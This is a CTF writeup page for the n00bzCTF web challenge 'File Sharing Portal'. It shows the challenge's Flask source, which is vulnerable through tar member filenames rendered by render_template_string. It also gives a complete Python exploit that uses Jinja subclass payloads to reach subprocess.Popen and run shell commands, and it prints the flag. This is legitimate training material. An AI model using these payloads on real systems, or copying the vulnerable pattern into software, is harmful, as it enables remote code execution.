
















<!DOCTYPE html>
<html lang='en'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Sharing Portal - ByteTheCookies</title>

    

    

    
    <meta name="author" content="ByteTheCookies" />
    

    
        <meta property="og:url" content="http://localhost:1313/writeups/noobzctf/filesharingportal/">
  <meta property="og:site_name" content="ByteTheCookies">
  <meta property="og:title" content="File Sharing Portal">
  <meta property="og:description" content="File Sharing Portal Description: Welcome to the file sharing portal! We only support tar files!
Introduction The ctf has a very simple structure: we have a form in which we are asked to insert a tar file; once the tar file has been inserted, it is unzipped and we are shown the name of files it contains; by clicking on the different files, we can read their contents.
Source The source has comments added later to allow a better understanding of the code in the writeups">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-08-06T11:27:07+02:00">
    <meta property="article:modified_time" content="2024-08-09T14:22:57+02:00">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Python">
    <meta property="article:tag" content="Template Injection">
    <meta property="article:tag" content="498 Points">
    <meta property="article:tag" content="119 Solves">
    <meta property="article:tag" content="NoobMaster &#43; NoobHacker">

    

    
        
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="File Sharing Portal">
  <meta name="twitter:description" content="File Sharing Portal Description: Welcome to the file sharing portal! We only support tar files!
Introduction The ctf has a very simple structure: we have a form in which we are asked to insert a tar file; once the tar file has been inserted, it is unzipped and we are shown the name of files it contains; by clicking on the different files, we can read their contents.
Source The source has comments added later to allow a better understanding of the code in the writeups">

    <link rel="stylesheet" href="/style.css" integrity="">



    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">



    
    <script>
        if (!('theme' in localStorage)) {
            localStorage.theme = 'dark';
        }

        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.setAttribute("data-theme", "dark");
        } else {
            document.documentElement.setAttribute("data-theme", "light");
        }
    </script>
<script defer src="/js/header.js" integrity=""></script>



    <script defer src="/js/zooming.js" integrity=""></script>







    
        

        
        

        
        
            
        

        <script defer src="/js/prism.js" integrity="" data-manual></script>
    



    
    
    
    <script defer src="/js/search-en.js" integrity=""></script>




<link rel="stylesheet" href="http://localhost:1313/user.css">

    
</head>
<body><header>
    <div id="header_left">
        <div id="sidebar_btn">
            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
            <label id="sidebar_btn_label" for="sidebar_btn_input">
                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
</svg>

</svg>
            </label>
            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
                <div id="sidebar_canvas_overlay"></div>
            </label>
            <div id="sidebar">
                <ul><li>
                            <a href="/">About</a></li><li>
                            <a href="/news/">News</a></li><li>
                            <a href="/writeups/">Writeups</a></li><li>
                            <a href="/contacts/">Contacts</a></li></ul>
            </div>
        </div>
    
        <div class="brand">
            <div>
                <a href="/">ByteTheCookies</a>
            </div>
        </div>
    </div>

    <div class="toolbox">
        <div id="theme_tool">
            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
</svg>

</svg>
            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
</svg>

</svg>
        </div>

        
            <div id="search_tool">
                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>

</svg><div id="search_menu_wrapper" class="hidden">
    <div id="search_menu">
        <div id="search_menu_toolbar">
            <div id="search_menu_input_wrapper">
                <input id="search_menu_input" type="text" placeholder='Search Posts'>
            </div>
            <div id="search_menu_close_btn">
                <svg width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
</svg>

</svg>
            </div>
        </div>
        <div id="search_menu_results">
        </div>
    </div>
</div>
</div>
        

        
            <div id="translation_tool" class="dropdown-wrapper pure-menu pure-menu-horizontal toolbox-btn" onclick="void(0)">
                <ul class="pure-menu-list">
                    <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
                        <div class="dropdown-btn pure-menu-link">
                            <svg width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
</svg>

</svg>
                            <span class="dropdown-desc">English</span>
                        </div>
                        <ul class="pure-menu-children">
                            
                            <li class="pure-menu-item">
                                <a href="http://localhost:1313/" class="pure-menu-link">English</a>
                            </li>
                            
                            <li class="pure-menu-item">
                                <a href="http://localhost:1313/it/" class="pure-menu-link">Italiano</a>
                            </li>
                            
                        </ul>
                    </li>
                </ul>
            </div>
        
    </div>
</header>
<nav id="navbar" class="pure-menu">
    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
                    
                        <a href="/" class="pure-menu-link">About</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/news/" class="pure-menu-link">News</a>
                    
                </li><li class="navbar-item pure-menu-item insection">
                    
                        <a href="/writeups/" class="pure-menu-link">Writeups</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/contacts/" class="pure-menu-link">Contacts</a>
                    
                </li></ul>
</nav>
<main>
            <div id="content" class="content-margin">
                
    
    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#source">Source</a></li>
    <li><a href="#solution">Solution</a></li>
  </ul>
</nav>
        
    </div></details>



<div class="tags">
  
    <div class="badge">Web</div>

  
    <div class="badge">Python</div>

  
    <div class="badge">Template Injection</div>

  
    <div class="badge">498 points</div>

  
    <div class="badge">119 solves</div>

  
    <div class="badge">NoobMaster &#43; NoobHacker</div>

  
</div>

<div>
  <p class="date">
    Last edit: Aug 6, 2024
  </p>
</div>


    <div class="content-margin">



<article >
    
    
        
        
    
    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>File Sharing Portal</h1>
<p><strong>Description</strong>: Welcome to the file sharing portal! We only support tar files!</p>

<h2 id="introduction" class="header-anchor-wrapper">Introduction
  <a href="#introduction" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>The ctf has a very simple structure: we have a form in which we are asked to insert a <a href="https://en.wikipedia.org/wiki/Tar_(computing)">tar</a> file; once the tar file has been inserted, it is unzipped and we are shown the <code>name</code> of files it contains; by clicking on the different files, we can read their contents.</p>

<h2 id="source" class="header-anchor-wrapper">Source
  <a href="#source" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p><strong>The source has comments added later to allow a better understanding of the code in the writeups</strong></p>
<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: server.py

#!/usr/bin/env python3
from flask import Flask, request, redirect, render_template, render_template_string
import tarfile
from hashlib import sha256
import os
app = Flask(__name__)

@app.route('/',methods=['GET','POST'])
def main():
    # This function mainly deals with loading the tar file into the server's file system.
    global username
    if request.method == 'GET':
        return render_template('index.html')
    elif request.method == 'POST':
        file = request.files['file']
        if file.filename[-4:] != '.tar': # Check that the file passed is actually a tar file
            return render_template_string(&quot;&lt;p&gt; We only support tar files as of right now!&lt;/p&gt;&quot;) # Otherwise, it renders an error message
        name = sha256(os.urandom(16)).digest().hex() # Creates a random name that it will use to name our tar and the folder in the server's file system
        os.makedirs(f&quot;./uploads/{name}&quot;, exist_ok=True) # Create the directory
        file.save(f&quot;./uploads/{name}/{name}.tar&quot;) # Save the tar file
        try:
            # Extract the tar file
            tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar')
            tar_file.extractall(path=f'./uploads/{name}/')
            return render_template_string(f&quot;&lt;p&gt;Tar file extracted! View &lt;a href='/view/{name}'&gt;here&lt;/a&gt;&quot;)
        except:
            return render_template_string(&quot;&lt;p&gt;Failed to extract file!&lt;/p&gt;&quot;)

@app.route('/view/&lt;name&gt;')
def view(name):
    # This function displays the files contained in the .tar file
    if not all([i in &quot;abcdef1234567890&quot; for i in name]): # Check that the file name is in hexadecimal, to avoid any kind of malicious input 
        return render_template_string(&quot;&lt;p&gt;Error!&lt;/p&gt;&quot;)
        #print(os.popen(f'ls ./uploads/{name}').read())
            #print(name)
    files = os.listdir(f&quot;./uploads/{name}&quot;) # List all files in the previously created folder 
    out = '&lt;h1&gt;Files&lt;/h1&gt;&lt;br&gt;'
    files.remove(f'{name}.tar')  # Remove the tar file from the list
    for i in files:
        out += f'&lt;a href=&quot;/read/{name}/{i}&quot;&gt;{i}&lt;/a&gt;' # Show via templates all file names
       # except:
    return render_template_string(out) # Render the template with the render_template_string function

@app.route('/read/&lt;name&gt;/&lt;file&gt;')
def read(name,file):
    # The function shows the contents of the single file
    if (not all([i in &quot;abcdef1234567890&quot; for i in name])): # Check that the file name is in hexadecimal, to avoid any kind of malicious input 
        return render_template_string(&quot;&lt;p&gt;Error!&lt;/p&gt;&quot;)
    if ((&quot;..&quot; in name) or (&quot;..&quot; in file)) or ((&quot;/&quot; in file) or &quot;/&quot; in name):  # Other controls to avoid path er
        return render_template_string(&quot;&lt;p&gt;Error!&lt;/p&gt;&quot;)
    f = open(f'./uploads/{name}/{file}') # Open the file
    data = f.read()
    f.close()
    return data # Return the content of file

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)


</code></pre>
<p>We can therefore see that there are several parameter checks, and at first one might think that the code is <code>100%</code> safe.</p>

<h2 id="solution" class="header-anchor-wrapper">Solution
  <a href="#solution" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>The first thing that came to mind was to create a <a href="https://www.futurelearn.com/info/courses/linux-for-bioinformatics/0/steps/201767">symbolic link</a> to access the flag, and indeed this works (try with server.py), the problem is that the filename of the flag is unknown and this does not allow us to create a valid symbolic link.</p>
<p>Once we realised this, we did a thorough analysis of the code and came to the conclusion that the only thing that was not being checked was the name of the unpacked tar file allowing us to insert anything. By combining this with the &lsquo;<code>render_template_string</code>&rsquo; function (a vulnerable function of flask), it is possible to perform a <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#what-is-ssti-server-side-template-injection">template injection</a>.</p>
<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py

import requests
import os
import tarfile
from bs4 import BeautifulSoup

url = 'http://redacted.challs.n00bzunit3d.xyz:8080/'


def create_tar(tar_name, file):
    with tarfile.open(tar_name, 'w') as tar:
        tar.add(file, arcname=os.path.basename(file))
    print(f'Tar file created: {tar_name}')


def create_payload(payload):
    with open(payload, 'w') as f:
        f.write('Remember to byte the cookies')

    create_tar('exploit.tar', payload)
    print(f'Payload created: {payload}')


def get_url_view(text):
    soup = BeautifulSoup(text, 'html5lib')
    return [a['href'] for a in soup.find_all('a', href=True)][0]


def leak_subprocess_index():
    payload = &quot;{{int.__class__.__base__.__subclasses__()}}&quot;
    create_payload(payload)

    r = requests.post(url, files={'file': open('exploit.tar', 'rb')})

    url_file = get_url_view(r.text)
    r = requests.get(url + url_file)
    text = r.text[r.text.index('[')+1:]

    list_classes = text.split(',')

    for i, c in enumerate(list_classes):
        if 'subprocess.Popen' in c:
            print(f'Index subprocess.Popen: {i}')
            return str(i)


def get_flag(index):
    payload = &quot;{{int.__class__.__base__.__subclasses__()[&quot; + \
        index + &quot;]('cat *', shell=True, stdout=-1).communicate()}}&quot;
    create_payload(payload)

    r = requests.post(url, files={'file': open('exploit.tar', 'rb')})

    url_file = get_url_view(r.text)
    r = requests.get(url + url_file)

    flag = r.text[r.text.index('n00bz{'):r.text.index('}')+1]
    print(f'Flag: {flag}')


def main():
    subprocess_index = leak_subprocess_index()
    get_flag(subprocess_index)


if __name__ == '__main__':
    main()


</code></pre>
<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: n00bz{n3v3r_7rus71ng_t4r_4g41n!_b3506983087e}
</code></pre>
<p align='right'>Author: akiidjk </p>
</article>
</div>


                
                    
                
            </div>
        </main>
<footer>
    <article>Copyright Â© 2024 by ByteTheCookies Team</article>
</footer>

</body>
</html>
